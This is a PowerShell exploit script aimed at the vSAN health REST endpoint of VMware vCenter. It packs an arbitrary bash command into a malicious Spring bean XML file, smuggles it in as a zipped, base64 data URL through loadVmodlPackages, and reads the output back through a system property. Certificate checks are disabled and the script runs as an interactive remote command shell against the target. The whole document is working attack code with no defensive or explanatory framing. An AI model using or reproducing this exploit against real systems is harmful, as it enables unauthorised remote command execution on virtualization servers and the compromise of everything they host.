
$target = $argv[1]

$bean_content = @"
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder">
        <constructor-arg>
          <list>
            <value>/bin/bash</value>
            <value>-c</value>
            <value><![CDATA[ #CMD# 2>&1 ]]></value>
          </list>
        </constructor-arg>
    </bean>
    <bean id="is" class="java.io.InputStreamReader">
        <constructor-arg>
            <value>#{pb.start().getInputStream()}</value>
        </constructor-arg>
    </bean>
    <bean id="br" class="java.io.BufferedReader">
        <constructor-arg>
            <value>#{is}</value>
        </constructor-arg>
    </bean>
    <bean id="collectors" class="java.util.stream.Collectors"></bean>
    <bean id="b64Coder" class="java.util.Base64"></bean>
    <bean id="newLine" class="java.lang.String">
        <constructor-arg>
            <value>#{b64Coder.getDecoder().decode("Cg==")}</value>
        </constructor-arg>
    </bean>
    <bean id="system" class="java.lang.System">
        <property name="whatever" value="#{system.setProperty(&quot;output&quot;, b64Coder.getEncoder().encodeToString(br.lines().collect(collectors.joining(newLine)).getBytes())) }"/>
    </bean>
</beans>
"@

Function GenCmd($cmd)
{
    [System.Reflection.Assembly]::LoadWithPartialName('System.IO.Compression') | Out-Null

    $XmlContent = $bean_content.replace("#CMD#", $cmd)
    $XmlBytes = [System.Text.Encoding]::UTF8.GetBytes($XmlContent)
    
    $ZipStream = New-Object System.IO.Memorystream

    $ZipArchive = New-Object System.IO.Compression.ZipArchive($ZipStream, [System.IO.Compression.ZipArchiveMode]::Update, $false, [System.Text.Encoding]::UTF8)
    $ZipEntry = $ZipArchive.CreateEntry("./.offline_bundle.xml")

    $XmlStream = New-Object System.IO.Memorystream
    $XmlStream.Write($XmlBytes, 0, $XmlBytes.Length)
    $XmlStream.Seek(0, [System.IO.SeekOrigin]::Begin)
    $ZipEntryStream = $ZipEntry.Open()
    $XmlStream.CopyTo($ZipEntryStream)

    $EntryReader = New-Object System.IO.StreamReader($ZipEntryStream)
    $EntryReader.BaseStream.Seek(0, [System.IO.SeekOrigin]::Begin)
    $ZipBytes = [System.Text.Encoding]::UTF8.GetBytes($EntryReader.ReadToEnd())

    return [Convert]::ToBase64String($ZipBytes)#.Replace('+', '-').Replace('/', '_').Replace('=', '')
}

if (-not("dummy" -as [type])) {
    add-type -TypeDefinition @"
using System;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;

public static class Dummy {
    public static bool ReturnTrue(object sender,
        X509Certificate certificate,
        X509Chain chain,
        SslPolicyErrors sslPolicyErrors) { return true; }

    public static RemoteCertificateValidationCallback GetDelegate() {
        return new RemoteCertificateValidationCallback(Dummy.ReturnTrue);
    }
}
"@
}

[System.Net.ServicePointManager]::ServerCertificateValidationCallback = [dummy]::GetDelegate()
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

Function Sendh5Vsan($beanName, $method, $param)
{
    $url = "https://$target/ui/h5-vsan/rest/proxy/service/$beanName/$method"
    $json = @{"methodInput" = $param} | ConvertTo-Json -Depth 5

    Write-Host $url
    Write-Host $json

    return Invoke-RestMethod -Method POST -ContentType "application/json" -Body $json -ErrorVariable RestError -ErrorAction SilentlyContinue -uri $url
}

$cmd = Read-Host
while($cmd -ne "bye")
{
    $cmdZip = GenCmd $cmd
    $cmdZip = ([uri]::EscapeDataString("data:text/html;base64,") + [uri]::EscapeDataString($cmdZip[2]))
    #Write-Host $cmdZip

    $param = [string[][]]@(@("https://localhost:443/vsanHealth/vum/driverOfflineBundle/$cmdZip"))

    $ct1 = Sendh5Vsan "vmodlContext" "loadVmodlPackages" $param
    Write-Host ($ct1 | ConvertTo-Json -Depth 5)
    if ( $ct1.Content -Contains "do not match" )
    {
        #$param = [string[]]@(@("https://localhost:443/vsanHealth/vum/driverOfflineBundle/$cmdZip"))
        Sendh5Vsan "vmodlContext" "loadVmodlPackages" $param
    }

    $ct = Sendh5Vsan "systemProperties" "getProperty" @("output", $null)
    Write-Host ($ct | ConvertTo-Json -Depth 5)
    $result=Get-Member -inputobject $ct -name "result" -Membertype Properties
    if( $result )
    {
        Write-Host [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($result))
    }
    else
    {
        Write-Host "exception!"
    }

    $cmd = Read-Host
}